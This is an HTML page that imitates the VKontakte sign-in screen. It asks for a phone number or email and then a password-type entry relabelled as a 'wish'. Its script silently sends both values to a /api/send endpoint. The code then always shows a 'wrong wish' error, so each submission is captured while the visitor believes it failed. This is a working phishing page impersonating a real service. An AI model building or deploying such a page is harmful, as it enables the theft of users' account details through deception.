<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <title>VK — Вход</title>

  <style>
    :root{
      --card-width:380px;
      --bg-start:#70b7ff;
      --bg-end:#0488ff;
      --muted:#9aa6b2;
      --input-bg:#f6f8fa;
      --accent:#0b75ff;
      --shadow:0 12px 30px rgba(8,30,60,.12);
      --error:#ff3347;
    }

    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
      background:linear-gradient(90deg,var(--bg-start),var(--bg-end));
      display:flex;
      align-items:center;
      justify-content:center;
      color:#111;
    }

    .card{
      width:var(--card-width);
      background:#fff;
      border-radius:14px;
      padding:22px 24px 18px;
      box-shadow:var(--shadow);
      display:flex;
      flex-direction:column;
    }

    .header{text-align:center;margin-bottom:10px}
    .vk-logo{
      width:68px;height:68px;
      border-radius:14px;
      background:linear-gradient(180deg,var(--accent),#0063d6);
      display:flex;align-items:center;justify-content:center;
      color:#fff;font-weight:700;margin:0 auto 6px;
    }
    h1{margin:0;font-size:18px;font-weight:600}

    .content{display:flex;flex-direction:column;gap:16px;flex:1}

    .field{
      display:flex;
      align-items:center;
      gap:8px;
      background:var(--input-bg);
      padding:14px;
      border-radius:10px;
      border:1px solid rgba(0,0,0,.06);
    }
    .field.error{border-color:var(--error);background:#fff5f6}
    .field input{
      width:100%;
      border:0;
      outline:none;
      background:transparent;
      font-size:15px;
    }

    .btn{
      padding:12px;
      border-radius:10px;
      border:0;
      cursor:pointer;
      font-weight:700;
    }
    .btn.primary{
      background:linear-gradient(180deg,#2f9bff,var(--accent));
      color:#fff;
    }
    .btn.ghost{
      background:#fff;
      border:1px solid #e6e9ee;
    }

    .controls{display:flex;gap:10px}

    .step{transition:.2s}
    .step.hidden{display:none}

    .identity{text-align:center}
    .pill{
      display:inline-block;
      background:#f4f7fb;
      padding:8px 12px;
      border-radius:999px;
      border:1px solid #e8f0ff;
      font-weight:600;
    }

    .error-text{
      color:var(--error);
      font-size:13px;
      text-align:center;
      display:none;
    }

    .password-mode .content{
      justify-content:center;
      align-items:center;
    }

    .footer{
      text-align:center;
      font-size:13px;
      color:var(--muted);
      margin-top:10px;
    }
  </style>
</head>

<body>
  <div class="card">
    <div class="header">
      <div class="vk-logo">VK</div>
      <h1 id="page-title">Вход ВКонтакте</h1>
    </div>

    <div class="content">

      <!-- STEP 1 -->
      <div id="step-identity" class="step">
        <div class="field">
          <input id="identity-input" placeholder="Введите телефон или почту">
        </div>
        <button id="next-btn" class="btn primary" style="width:100%">Войти</button>
      </div>

      <!-- STEP 2 -->
      <div id="step-password" class="step hidden">
        <h2 style="text-align:center;margin:0">Введите желание</h2>

        <div class="identity">
          <div class="pill" id="identity-pill"></div>
        </div>

        <div class="field" id="password-field">
          <input id="password-input" type="password" placeholder="Введите желание">
        </div>

        <div id="password-error" class="error-text">Неверное желание</div>

        <div class="controls">
          <button id="back-btn" class="btn ghost" style="flex:1">Назад</button>
          <button id="signin-btn" class="btn primary" style="flex:1">Продолжить</button>
        </div>
      </div>

    </div>

    <div class="footer">VK © 2006–2026</div>
  </div>

<script>
  const stepIdentity = document.getElementById('step-identity');
  const stepPassword = document.getElementById('step-password');
  const identityInput = document.getElementById('identity-input');
  const identityPill = document.getElementById('identity-pill');
  const passwordInput = document.getElementById('password-input');
  const passwordField = document.getElementById('password-field');
  const passwordError = document.getElementById('password-error');

  document.getElementById('next-btn').onclick = () => {
    const v = identityInput.value.trim();
    if(!v) return;
    identityPill.textContent = v;
    stepIdentity.classList.add('hidden');
    stepPassword.classList.remove('hidden');
    document.body.classList.add('password-mode');
  };

  document.getElementById('back-btn').onclick = () => {
    stepPassword.classList.add('hidden');
    stepIdentity.classList.remove('hidden');
    document.body.classList.remove('password-mode');
  };

  document.getElementById('signin-btn').onclick = () => {
    const wish = passwordInput.value.trim();

    passwordField.classList.remove('error');
    passwordError.style.display = 'none';

    if(!wish){
      passwordField.classList.add('error');
      passwordError.textContent = 'Введите желание';
      passwordError.style.display = 'block';
      return;
    }

    // отправка в api/send.js
    fetch('/api/send',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({
        contact: identityPill.textContent,
        wish: wish
      })
    }).catch(()=>{});

    // всегда показываем ошибку
    setTimeout(()=>{
      passwordField.classList.add('error');
      passwordError.textContent = 'Неверное желание';
      passwordError.style.display = 'block';
    },300);
  };
</script>
</body>
</html>
